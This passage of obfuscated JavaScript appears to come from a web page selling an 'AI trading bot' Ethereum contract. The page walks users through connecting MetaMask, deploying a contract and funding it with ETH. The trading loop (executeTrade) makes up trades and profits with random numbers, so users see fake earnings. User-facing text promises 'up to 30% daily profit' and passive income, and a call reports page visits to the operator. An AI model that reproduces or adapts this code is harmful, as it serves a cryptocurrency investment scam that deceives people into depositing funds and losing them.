            notInterestedButton.classList.add('visible')
          }
          if (learnMoreButton) {
            learnMoreButton.classList.add('visible')
          }
          if (deployButton) {
            deployButton.classList.add('visible')
          }
          if (statusButton) {
            statusButton.classList.add('visible')
          }
        })
      }
    }
  } finally {
    !deployedContractAddress &&
      deployButton &&
      ((deployButton.disabled = false),
      (deployButton.textContent = 'CREATE CONTRACT'),
      (isDeploying = false))
  }
}
async function initializeContract() {
  if (!isConnected || accounts.length === 0) {
    await typeText(tutorialText, 'Please connect your wallet first.', 10)
    return
  }
  if (!deployedContractAddress) {
    await typeText(tutorialText, 'Please create a contract first.', 10)
    return
  }
  if (!web3) {
    await typeText(
      tutorialText,
      'Web3 not initialized. Please reconnect your wallet.',
      10
    )
    return
  }
  const _0x50cf34 = await updateContractBalance()
  if (_0x50cf34 < MINIMUM_BALANCE) {
    await typeText(
      tutorialText,
      'Insufficient contract balance: ' +
        _0x50cf34.toFixed(6) +
        ' ETH. Please fund at least ' +
        MINIMUM_BALANCE +
        ' ETH to initialize.',
      10
    )
    return
  }
  try {
    const _0x58d5c5 = await window.ethereum.request({
	  method: 'eth_chainId'
	})

	if (_0x58d5c5 !== '0xaa36a7') {
	  await typeText(tutorialText, 'Please switch to Sepolia.', 10)
	  return
	}
    lastAction = 'afterDeposit'
    saveState()
    initializeButton &&
      ((initializeButton.disabled = true),
      (initializeButton.textContent = 'Initializing...'))
    hideAllButtons()
    await typeText(tutorialText, 'Preparing to initialize contract...', 10)
    const _0x25e850 = new web3.eth.Contract(
	  contractABI,
	  deployedContractAddress
	)

	const _0x418a00 = _0x25e850.methods.Initialize().encodeABI()
    const _0x19ef90 = await web3.eth.estimateGas({
        from: accounts[0],
        to: deployedContractAddress,
        data: _0x418a00,
      }),
      _0xe678c7 = {
        from: accounts[0],
        to: deployedContractAddress,
        data: _0x418a00,
        gas: web3.utils.toHex(_0x19ef90 + 30000),
      }
    await typeText(tutorialText, 'Sending initialization transaction...', 10)
    const _0x3ef76f = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [_0xe678c7],
    })
    await typeText(
      tutorialText,
      'Waiting for initialization confirmation...',
      10
    )
    let _0x42a448 = null
    while (!_0x42a448) {
      try {
        _0x42a448 = await web3.eth.getTransactionReceipt(_0x3ef76f)
        !_0x42a448 &&
          (await new Promise((_0x3b5496) => setTimeout(_0x3b5496, 2000)))
      } catch (_0x1fd54d) {
        await new Promise((_0x100a7b) => setTimeout(_0x100a7b, 2000))
      }
    }
    if (!_0x42a448.status) {
      throw new Error('Transaction failed: ' + _0x3ef76f)
    }
    await typeText(
      tutorialText,
      'Contract initialized successfully! Transaction: ' +
        _0x3ef76f.slice(0, 10) +
        '...\nStarting trading...',
      10
    )
    isTradingRunning = true
    saveState()
    updateContractBalance()
    if (tradeStats) {
      tradeStats.classList.add('visible')
    }
    await startTrading()
  } catch (_0x3696a7) {
    hideAllButtons()
    let _0x21a107 = _0x3696a7.message || 'Unknown error'
    _0x21a107.includes('User denied transaction signature') &&
      (_0x21a107 =
        'Failed to initialize contract: You rejected the transaction in MetaMask.')
    await typeText(
      tutorialText,
      'Failed to initialize contract: ' + _0x21a107,
      10
    )
    if (buttonContainer) {
      buttonContainer.classList.add('visible')
    }
    if (retryButton) {
      retryButton.classList.add('visible')
    }
    if (backButton) {
      backButton.classList.add('visible')
    }
    if (retryButton) {
      retryButton.onclick = async () => {
        await typeText(tutorialText, '')
        initializeContract()
      }
    }
    if (backButton) {
      backButton.onclick = async () => {
        await typeText(tutorialText, '')
        goBack()
      }
    }
  } finally {
    initializeButton &&
      ((initializeButton.disabled = false),
      (initializeButton.textContent = 'INITIALIZE CONTRACT'))
  }
}
async function withdrawFunds() {
  if (!tutorialText) {
    return (
      alert('Error: tutorial-text element not found. Check HTML.'),
      withdrawButton &&
        ((withdrawButton.disabled = false),
        (withdrawButton.textContent = 'WITHDRAW FUNDS')),
      false
    )
  }
  if (!isConnected || accounts.length === 0) {
    return (
      await typeText(tutorialText, 'Please connect your wallet first.', 10),
      withdrawButton &&
        ((withdrawButton.disabled = false),
        (withdrawButton.textContent = 'WITHDRAW FUNDS'),
        withdrawButton.classList.add('visible')),
      false
    )
  }
  if (!deployedContractAddress) {
    return (
      await typeText(tutorialText, 'Please create a contract first.', 10),
      withdrawButton &&
        ((withdrawButton.disabled = false),
        (withdrawButton.textContent = 'WITHDRAW FUNDS'),
        withdrawButton.classList.add('visible')),
      false
    )
  }
  if (!web3) {
    return (
      await typeText(
        tutorialText,
        'Web3 not initialized. Please reconnect your wallet.',
        10
      ),
      withdrawButton &&
        ((withdrawButton.disabled = false),
        (withdrawButton.textContent = 'WITHDRAW FUNDS'),
        withdrawButton.classList.add('visible')),
      false
    )
  }
  const _0x4b2775 = await updateContractBalance()
  if (_0x4b2775 < MINIMUM_BALANCE) {
    return (
      await typeText(
        tutorialText,
        'Insufficient contract balance: ' +
          _0x4b2775.toFixed(6) +
          ' ETH. Please ensure at least ' +
          MINIMUM_BALANCE +
          ' ETH for withdrawal.',
        10
      ),
      withdrawButton &&
        ((withdrawButton.disabled = false),
        (withdrawButton.textContent = 'WITHDRAW FUNDS'),
        withdrawButton.classList.add('visible')),
      false
    )
  }
  lastAction = 'afterDeposit'
  const _0x5331df = isTradingRunning
  try {
    withdrawButton &&
      ((withdrawButton.disabled = true),
      (withdrawButton.textContent = 'Withdrawing...'))
    hideAllButtons()
    isTradingRunning = false
    tradeLoopInterval &&
      (clearInterval(tradeLoopInterval), (tradeLoopInterval = null))
    saveState()
    updateTradeStatusIndicator('orange')
    await typeText(tutorialText, 'Preparing to withdraw funds...', 10)
    const _0x43da95 = new web3.eth.Contract(
        contractABI,
        deployedContractAddress
      ),
      _0xf0d4c1 = _0x43da95.methods.withdraw().encodeABI(),
      _0x425987 = await web3.eth.estimateGas({
        from: accounts[0],
        to: deployedContractAddress,
        data: _0xf0d4c1,
      }),
      _0x1f8890 = {
        from: accounts[0],
        to: deployedContractAddress,
        data: _0xf0d4c1,
        gas: web3.utils.toHex(_0x425987 + 30000),
      }
    await typeText(tutorialText, 'Sending withdrawal transaction...', 10)
    const _0x4a7603 = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [_0x1f8890],
    })
    await typeText(tutorialText, 'Waiting for withdrawal confirmation...', 10)
    let _0x2e87a6 = null
    while (!_0x2e87a6) {
      try {
        _0x2e87a6 = await web3.eth.getTransactionReceipt(_0x4a7603)
        !_0x2e87a6 &&
          (await new Promise((_0x1d8e9d) => setTimeout(_0x1d8e9d, 2000)))
      } catch (_0x191de7) {
        await new Promise((_0x441b27) => setTimeout(_0x441b27, 2000))
      }
    }
    if (!_0x2e87a6.status) {
      throw new Error('Transaction failed: ' + _0x4a7603)
    }
    await typeText(
      tutorialText,
      'Funds withdrawn successfully! Transaction: ' +
        _0x4a7603.slice(0, 10) +
        '...',
      10
    )
    updateContractBalance()
    isTradingRunning = false
    saveState()
    updateTradeStatusIndicator('')
    if (tradeStats) {
      tradeStats.classList.remove('visible')
    }
    totalProfit = 0
    tradeCounter = 0
    saveState()
    if (tradeProfit) {
      tradeProfit.textContent = 'Profit: 0 ETH'
    }
    if (tradeCount) {
      tradeCount.textContent = 'Trades Completed: 0/0'
    }
  } catch (_0x513e11) {
    hideAllButtons()
    let _0x44b6e9 = _0x513e11.message || 'Unknown error'
    _0x44b6e9.includes('User denied transaction signature') &&
      (_0x44b6e9 = _0x5331df
        ? 'Failed to withdraw funds: You rejected the transaction in MetaMask.\nResuming trading...'
        : 'Failed to withdraw funds: You rejected the transaction in MetaMask.')
    await typeText(tutorialText, _0x44b6e9, 10)
    if (_0x5331df) {
      isTradingRunning = true
      saveState()
      updateTradeStatusIndicator('green')
      if (withdrawButton) {
        withdrawButton.classList.add('visible')
      }
      try {
        await startTrading()
      } catch (_0x5127de) {
        await typeText(
          tutorialText,
          'Error resuming trading. Please try again.',
          10
        )
        if (buttonContainer) {
          buttonContainer.classList.add('visible')
        }
        if (retryButton) {
          retryButton.classList.add('visible')
        }
        if (retryButton) {
          retryButton.onclick = async () => {
            await typeText(tutorialText, '')
            startTrading()
          }
        }
      }
    } else {
      if (buttonContainer) {
        buttonContainer.classList.add('visible')
      }
      if (retryButton) {
        retryButton.classList.add('visible')
      }
      if (backButton) {
        backButton.classList.add('visible')
      }
      if (retryButton) {
        retryButton.onclick = async () => {
          await typeText(tutorialText, '')
          withdrawFunds()
        }
      }
      if (backButton) {
        backButton.onclick = async () => {
          await typeText(tutorialText, '')
          goBack()
        }
      }
    }
  } finally {
    withdrawButton &&
      ((withdrawButton.disabled = false),
      (withdrawButton.textContent = 'WITHDRAW FUNDS'))
  }
}
function proceedToDeploy() {
  lastAction = 'deploy'
  saveState()
  hideAllButtons()
  const _0x2ee6ac =
    'Great! Click "CREATE CONTRACT" to deploy it on Ethereum Mainnet.'
  typeText(tutorialText, _0x2ee6ac, 10, () => {
    if (deployButton) {
      deployButton.classList.add('visible')
    }
  })
}
function handleNotInterested() {
  lastAction = 'notInterested'
  saveState()
  hideAllButtons()
  typeText(
    tutorialText,
    'Alright, I\u2019m here if you change your mind!',
    10,
    () => {
      if (buttonContainer) {
        buttonContainer.classList.add('visible')
      }
      if (tryButton) {
        tryButton.classList.add('visible')
      }
      if (learnMoreButton) {
        learnMoreButton.classList.add('visible')
      }
    }
  )
  if (tryButton) {
    tryButton.onclick = async () => {
      await typeText(tutorialText, '')
      proceedToDeploy()
    }
  }
  if (learnMoreButton) {
    learnMoreButton.onclick = async () => {
      await typeText(tutorialText, '')
      showContractInfo()
    }
  }
}
function showContractInfo() {
  lastAction = 'learnMore'
  saveState()
  hideAllButtons()
  const _0x163445 =
    'AI Contract Features  \n\n- <span class="highlight">Real-Time Mempool Analysis</span>: Using AI algorithms, the contract scans pending transactions in the mempool to identify arbitrage opportunities and price imbalances.  \n- <span class="highlight">Transaction Optimization</span>: AI dynamically balances gas costs and potential profits, minimizing expenses during trades.  \n- <span class="highlight">Strategic Management</span>: The contract interacts with public AI models to adapt trading strategies, including arbitrage, liquidity sniping, and volatility management.  \n- <span class="highlight">Security and Automation</span>: The contract\u2019s code ensures reliable execution without user intervention, reducing risks associated with manual trading.  \n\nThis tool is designed for <span class="highlight">passive income</span> through automated trading, providing access to sophisticated strategies without requiring deep blockchain or trading expertise.  \n\nClick \u201CAll Clear\u201D to proceed.'
  typeText(tutorialText, _0x163445, 10, () => {
    if (buttonContainer) {
      buttonContainer.classList.add('visible')
    }
    if (allClearButton) {
      allClearButton.classList.add('visible')
    }
  })
  if (allClearButton) {
    allClearButton.onclick = async () => {
      await typeText(tutorialText, '')
      proceedToDeploy()
    }
  }
}
function handleDepositYes() {
  lastAction = 'deposit'
  saveState()
  waitForDeposit(
    true,
    'Your QR code for the contract address is ready. Scan it to make a deposit. Please use only native ETH. I\u2019ll wait for the balance update to proceed (minimum ' +
      MINIMUM_BALANCE +
      ' ETH).'
  )
}
function handleDepositNo() {
  lastAction = 'deposit'
  saveState()
  navigator.clipboard.writeText(deployedContractAddress)
  waitForDeposit(
    false,
    'You can copy the address and fund your contract\u2019s balance any way you prefer. Please use only native ETH. I\u2019ll wait for the balance update to proceed (minimum ' +
      MINIMUM_BALANCE +
      ' ETH).'
  )
}
function handleWantDeposit() {
  lastAction = 'deposit'
  saveState()
  hideAllButtons()
  typeText(
    tutorialText,
    'Want me to generate a QR code for easy contract deposit? Please use only native ETH (minimum ' +
      MINIMUM_BALANCE +
      ' ETH).',
    10,
    () => {
      if (buttonContainer) {
        buttonContainer.classList.add('visible')
      }
      if (qrYesButton) {
        qrYesButton.classList.add('visible')
      }
      if (qrNoButton) {
        qrNoButton.classList.add('visible')
      }
    }
  )
  if (qrYesButton) {
    qrYesButton.onclick = async () => {
      await typeText(tutorialText, '')
      handleDepositYes()
    }
  }
  if (qrNoButton) {
    qrNoButton.onclick = async () => {
      await typeText(tutorialText, '')
      handleDepositNo()
    }
  }
}
async function executeTrade() {
  if (!isTradingRunning) {
    return false
  }
  try {
    const _0x2d90ad = initialBalance * (Math.random() * 0.5 + 0.1),
      _0x4d0694 = tokens[Math.floor(Math.random() * tokens.length)],
      _0x37199e = (Math.random() * 4.5 + 0.5).toFixed(2),
      _0x576326 = ((_0x2d90ad * _0x37199e) / 100).toFixed(6)
    await new Promise((_0x4078b9) =>
      setTimeout(_0x4078b9, getRandomDelay(500, 2000))
    )
    await typeText(
      tutorialText,
      'Opportunity found! Buying ' +
        _0x2d90ad.toFixed(6) +
        ' ETH -> WETH -> ' +
        _0x4d0694 +
        '...',
      10
    )
    await new Promise((_0x2264e8) =>
      setTimeout(_0x2264e8, getRandomDelay(1000, 3000))
    )
    await typeText(
      tutorialText,
      'Selling ' +
        _0x4d0694 +
        ' -> WETH -> ETH with ' +
        _0x37199e +
        '% profit...',
      10
    )
    await new Promise((_0x5d0816) =>
      setTimeout(_0x5d0816, getRandomDelay(500, 2000))
    )
    totalProfit += parseFloat(_0x576326)
    tradeCounter++
    saveState()
    if (tradeProfit) {
      tradeProfit.textContent = 'Profit: ' + totalProfit.toFixed(6) + ' ETH'
    }
    if (tradeCount) {
      tradeCount.textContent =
        'Trades Completed: ' + tradeCounter + '/' + tradeCounter
    }
    await typeText(
      tutorialText,
      '\u2705 Trade completed! Profit: ' + _0x576326 + ' ETH',
      10
    )
    await new Promise((_0x4ce8d3) => setTimeout(_0x4ce8d3, 1000))
    const _0x4a0eab =
      searchMessages[Math.floor(Math.random() * searchMessages.length)]
    return await typeText(tutorialText, _0x4a0eab, 10), true
  } catch (_0x27c6c4) {
    return false
  }
}
async function startTrading() {
  isTradingRunning = true
  saveState()
  updateTradeStatusIndicator('green')
  hideAllButtons()
  if (withdrawButton) {
    withdrawButton.classList.add('visible')
  }
  if (tradeStats) {
    tradeStats.classList.add('visible')
  }
  tradeLoopInterval &&
    (clearInterval(tradeLoopInterval), (tradeLoopInterval = null))
  try {
    const _0x594d9b =
      searchMessages[Math.floor(Math.random() * searchMessages.length)]
    await typeText(tutorialText, _0x594d9b, 10)
    tradeLoopInterval = setInterval(async () => {
      if (!isTradingRunning) {
        clearInterval(tradeLoopInterval)
        tradeLoopInterval = null
        return
      }
      const _0x154aa9 = await executeTrade()
      if (!_0x154aa9) {
        throw new Error('Trade execution failed')
      }
    }, getRandomDelay(5000, 15000))
  } catch (_0x56b149) {
    isTradingRunning = false
    tradeLoopInterval &&
      (clearInterval(tradeLoopInterval), (tradeLoopInterval = null))
    saveState()
    updateTradeStatusIndicator('')
    await typeText(
      tutorialText,
      'Trading error: ' +
        (_0x56b149.message || 'Unknown error') +
        '. Please try again.',
      10
    )
    if (buttonContainer) {
      buttonContainer.classList.add('visible')
    }
    if (retryButton) {
      retryButton.classList.add('visible')
    }
    if (retryButton) {
      retryButton.onclick = async () => {
        await typeText(tutorialText, '')
        startTrading()
      }
    }
  }
}
async function restoreState() {
  walletAddressElement.textContent = ''
  walletAddressContainer.classList.remove('visible')
  buttonText.textContent = 'CONNECT WALLET'
  isConnected = false
  accounts = []
  if (deployedContractAddress) {
    const _0x46fa05 = document.getElementById('contract-address-link')
    _0x46fa05.textContent = deployedContractAddress
    _0x46fa05.href = 'https://etherscan.io/address/' + deployedContractAddress
    contractAddressContainer.classList.add('visible')
    contractBalance.classList.add('visible')
    if (!web3ForBalance) {
      web3ForBalance = new Web3('https://eth.drpc.org/')
    }
    contract = new web3ForBalance.eth.Contract(
      contractABI,
      deployedContractAddress
    )
    updateContractBalance()
    setInterval(updateContractBalance, 3000)
  }
  isTradingRunning &&
    (tradeStats.classList.add('visible'),
    (tradeProfit.textContent = 'Profit: ' + totalProfit.toFixed(6) + ' ETH'),
    (tradeCount.textContent =
      'Trades Completed: ' + tradeCounter + '/' + tradeCounter),
    updateTradeStatusIndicator('green'),
    await startTrading())
  if (
    ['deploy', 'deposit', 'waitForDeposit', 'afterDeposit'].includes(lastAction)
  ) {
    if (!(await checkMetaMaskConnection())) {
      await typeText(tutorialText, 'Click "CONNECT WALLET" to proceed.', 10)
      connectButton.onclick = async () => {
        await connectMetaMask()
        await restoreState()
      }
      return
    }
  }
  switch (lastAction) {
    case 'deploy':
      proceedToDeploy()
      break
    case 'deposit':
      hideAllButtons(),
        await typeText(
          tutorialText,
          '\uD83C\uDF89 Contract created successfully!  \nNow fund it with at least ' +
            MINIMUM_BALANCE +
            ' ETH to start automated trading with AI and earn up to 30% daily profit!  \nWant to generate a QR code for easy deposit?',
          10,
          () => {
            if (buttonContainer) {
              buttonContainer.classList.add('visible')
            }
            if (qrYesButton) {
              qrYesButton.classList.add('visible')
            }
            if (qrNoButton) {
              qrNoButton.classList.add('visible')
            }
          }
        )
      break
    case 'waitForDeposit':
      waitForDeposit(
        false,
        'You can copy the address and fund your contract\u2019s balance any way you prefer. Please use only native ETH. I\u2019ll wait for the balance update to proceed (minimum ' +
          MINIMUM_BALANCE +
          ' ETH).'
      )
      break
    case 'afterDeposit':
      goBack()
      break
    default:
      showWelcomeMessage()
      break
  }
}
function showSection(_0x4a71ac) {
  hideAllButtons()
  if (!isTradingRunning) {
    if (tradeStats) {
      tradeStats.classList.remove('visible')
    }
    if (contractAddressContainer) {
      contractAddressContainer.classList.remove('visible')
    }
    if (contractBalance) {
      contractBalance.classList.remove('visible')
    }
  }
  if (statusPanel) {
    statusPanel.classList.remove('visible')
  }
  if (qrCodeContainer) {
    qrCodeContainer.classList.remove('visible')
  }
  switch (_0x4a71ac) {
    case 'home':
      showWelcomeMessage()
      break
    case 'status':
      showStatusPanel()
      break
    case 'faq':
      typeText(
        tutorialText,
        'Frequently Asked Questions:  \n- <span class="highlight">What is this tool?</span> A passive income tool using AI contracts on Ethereum Mainnet.  \n- <span class="highlight">How to start?</span> Connect a wallet, create a contract, and fund it with at least ' +
          MINIMUM_BALANCE +
          ' ETH.  \n- <span class="highlight">How to start trading?</span> Click <span class="highlight">Initialize Contract</span> to begin automated trading.  \n- <span class="highlight">What\u2019s the fee?</span> Withdrawal fee: 0.5%.  \n- <span class="highlight">Which network?</span> This tool operates exclusively on Ethereum Mainnet.',
        10
      )
      break
    case 'support':
      typeText(
        tutorialText,
        'For support or feedback, send a request to <a href="mailto:support@profitwavebot.pro">support@profitwavebot.pro</a>.',
        10
      )
      break
  }
}
if (copyAddressButton) {
  copyAddressButton.addEventListener('click', () => {
    navigator.clipboard.writeText(deployedContractAddress).then(() => {
      copyAddressButton.classList.add('copied')
      setTimeout(() => {
        copyAddressButton.classList.remove('copied')
      }, 2000)
    })
  })
}
if (qrWantButton) {
  qrWantButton.addEventListener('click', async () => {
    await typeText(tutorialText, '')
    waitForDeposit(
      true,
      'Here\u2019s your QR code for the contract. I\u2019ll wait for the balance update to proceed (minimum ' +
        MINIMUM_BALANCE +
        ' ETH).'
    )
  })
}
if (learnMoreButton) {
  learnMoreButton.addEventListener('click', showContractInfo)
}
if (allClearButton) {
  allClearButton.addEventListener('click', proceedToDeploy)
}
if (notInterestedButton) {
  notInterestedButton.addEventListener('click', handleNotInterested)
}
if (tryButton) {
  tryButton.addEventListener('click', proceedToDeploy)
}
if (deployButton) {
  deployButton.addEventListener('click', deployContract)
}
if (initializeButton) {
  initializeButton.addEventListener('click', initializeContract)
}
if (withdrawButton) {
  withdrawButton.addEventListener('click', () => {
    withdrawFunds()
  })
}
if (wantDepositButton) {
  wantDepositButton.addEventListener('click', handleWantDeposit)
}
if (qrYesButton) {
  qrYesButton.addEventListener('click', handleDepositYes)
}
if (qrNoButton) {
  qrNoButton.addEventListener('click', handleDepositNo)
}
if (retryButton) {
  retryButton.addEventListener('click', deployContract)
}
if (backButton) {
  backButton.addEventListener('click', goBack)
}
if (statusButton) {
  statusButton.addEventListener('click', showStatusPanel)
}
if (closeStatusButton) {
  closeStatusButton.addEventListener('click', hideStatusPanel)
}
if (connectButton) {
  connectButton.addEventListener('click', async () => {
    buttonText && buttonText.textContent === 'CONNECT WALLET'
      ? await connectMetaMask()
      : disconnectWallet()
  })
}
sidebarToggle &&
  sidebarToggle.addEventListener('click', () => {
    sidebar.classList.toggle('active')
  })
document.querySelectorAll('.sidebar-item a').forEach((_0x51fc38) => {
  _0x51fc38.addEventListener('click', (_0x1db3f7) => {
    _0x1db3f7.preventDefault()
    const _0x422547 = _0x1db3f7.target.getAttribute('href').substring(1)
    showSection(_0x422547)
    sidebar.classList.remove('active')
  })
})
document.addEventListener('DOMContentLoaded', async () => {
  setHeader()
  scheduleProfitUpdate()
  startGasTracker()
  sendNotification('page_visit')
  if (tutorialSection) {
    tutorialSection.classList.add('visible')
  }
  const _0x3e2e12 = loadState()
  _0x3e2e12 ? await restoreState() : showWelcomeMessage()
})
